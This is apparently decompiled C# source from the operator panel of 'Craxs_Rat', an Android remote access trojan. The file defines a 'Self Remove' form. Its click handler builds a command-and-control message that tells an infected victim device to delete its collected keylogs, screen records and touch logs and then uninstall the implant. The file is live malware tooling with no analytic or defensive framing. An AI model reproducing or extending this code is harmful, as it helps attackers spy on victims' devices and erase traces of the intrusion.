using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class SelfRemove : Form
{
	private IContainer components;

	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	public Client Classclient;

	[field: AccessedThroughProperty("Label34")]
	internal virtual Label Label34
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("clientpic")]
	internal virtual PictureBox clientpic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkrecords")]
	internal virtual DrakeUICheckBox checkrecords
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkkeylogs")]
	internal virtual DrakeUICheckBox checkkeylogs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checktouch")]
	internal virtual DrakeUICheckBox checktouch
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public SelfRemove()
	{
		base.Load += SelfRemove_Load;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.Label34 = new System.Windows.Forms.Label();
		this.Label1 = new System.Windows.Forms.Label();
		this.Label2 = new System.Windows.Forms.Label();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.clientpic = new System.Windows.Forms.PictureBox();
		this.checkrecords = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkkeylogs = new DrakeUI.Framework.DrakeUICheckBox();
		this.checktouch = new DrakeUI.Framework.DrakeUICheckBox();
		((System.ComponentModel.ISupportInitialize)this.clientpic).BeginInit();
		base.SuspendLayout();
		this.Label34.AutoSize = true;
		this.Label34.BackColor = System.Drawing.Color.Transparent;
		this.Label34.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label34.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label34.Location = new System.Drawing.Point(99, 143);
		this.Label34.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label34.Name = "Label34";
		this.Label34.Size = new System.Drawing.Size(205, 30);
		this.Label34.TabIndex = 66;
		this.Label34.Text = "Remove Records";
		this.Label1.AutoSize = true;
		this.Label1.BackColor = System.Drawing.Color.Transparent;
		this.Label1.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label1.Location = new System.Drawing.Point(99, 212);
		this.Label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(200, 30);
		this.Label1.TabIndex = 68;
		this.Label1.Text = "Remove keylogs";
		this.Label2.AutoSize = true;
		this.Label2.BackColor = System.Drawing.Color.Transparent;
		this.Label2.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Label2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label2.Location = new System.Drawing.Point(99, 279);
		this.Label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(202, 30);
		this.Label2.TabIndex = 70;
		this.Label2.Text = "Remove touches";
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(22, 359);
		this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(277, 35);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 61546;
		this.DrakeUIButtonIcon1.TabIndex = 71;
		this.DrakeUIButtonIcon1.Text = "Start Remove";
		this.clientpic.Location = new System.Drawing.Point(120, 27);
		this.clientpic.Name = "clientpic";
		this.clientpic.Size = new System.Drawing.Size(97, 81);
		this.clientpic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.clientpic.TabIndex = 72;
		this.clientpic.TabStop = false;
		this.checkrecords.CheckBoxColor = System.Drawing.Color.FromArgb(30, 136, 229);
		this.checkrecords.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkrecords.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkrecords.Location = new System.Drawing.Point(22, 144);
		this.checkrecords.Name = "checkrecords";
		this.checkrecords.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkrecords.Size = new System.Drawing.Size(45, 29);
		this.checkrecords.TabIndex = 73;
		this.checkkeylogs.CheckBoxColor = System.Drawing.Color.FromArgb(30, 136, 229);
		this.checkkeylogs.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkkeylogs.Font = new System.Drawing.Font("Calibri", 12f);
		this.checkkeylogs.Location = new System.Drawing.Point(22, 213);
		this.checkkeylogs.Name = "checkkeylogs";
		this.checkkeylogs.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkkeylogs.Size = new System.Drawing.Size(45, 29);
		this.checkkeylogs.TabIndex = 74;
		this.checktouch.CheckBoxColor = System.Drawing.Color.FromArgb(30, 136, 229);
		this.checktouch.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checktouch.Font = new System.Drawing.Font("Calibri", 12f);
		this.checktouch.Location = new System.Drawing.Point(22, 280);
		this.checktouch.Name = "checktouch";
		this.checktouch.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checktouch.Size = new System.Drawing.Size(45, 29);
		this.checktouch.TabIndex = 75;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(328, 424);
		base.Controls.Add(this.checktouch);
		base.Controls.Add(this.checkkeylogs);
		base.Controls.Add(this.checkrecords);
		base.Controls.Add(this.clientpic);
		base.Controls.Add(this.DrakeUIButtonIcon1);
		base.Controls.Add(this.Label2);
		base.Controls.Add(this.Label1);
		base.Controls.Add(this.Label34);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "SelfRemove";
		base.ShowIcon = false;
		this.Text = "Self Remove";
		base.TopMost = true;
		((System.ComponentModel.ISupportInitialize)this.clientpic).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		switch (Interaction.MsgBox("The App will be uninstalled . and client won't come back\r\nAre you sure you want to Continue", MsgBoxStyle.YesNo, "Alert"))
		{
		case MsgBoxResult.Yes:
		{
			TcpClient myClient = Classclient.myClient;
			string[] array = Classclient.Keys.Split(':');
			int num = 0;
			int num2 = 0;
			string text = "";
			if (checkrecords.Checked)
			{
				text += "_RE_";
			}
			if (checkkeylogs.Checked)
			{
				text += "_FK_";
			}
			if (checktouch.Checked)
			{
				text += "_TH_";
			}
			object[] parametersObjects = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SFD<*>SLF" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + Classclient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				Classclient
			};
			Classclient.SendMessage(parametersObjects);
			break;
		}
		}
	}

	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
			{
				Label1.Text = Codes.Translate(Label1.Text, "en", "ar");
				Label2.Text = Codes.Translate(Label2.Text, "en", "ar");
				Label34.Text = Codes.Translate(Label34.Text, "en", "ar");
			}
		}
		else
		{
			Label1.Text = Codes.Translate(Label1.Text, "en", "zh");
			Label2.Text = Codes.Translate(Label2.Text, "en", "zh");
			Label34.Text = Codes.Translate(Label34.Text, "en", "zh");
		}
	}

	private void SelfRemove_Load(object sender, EventArgs e)
	{
		clientpic.Image = Classclient.Wallpaper;
	}
}
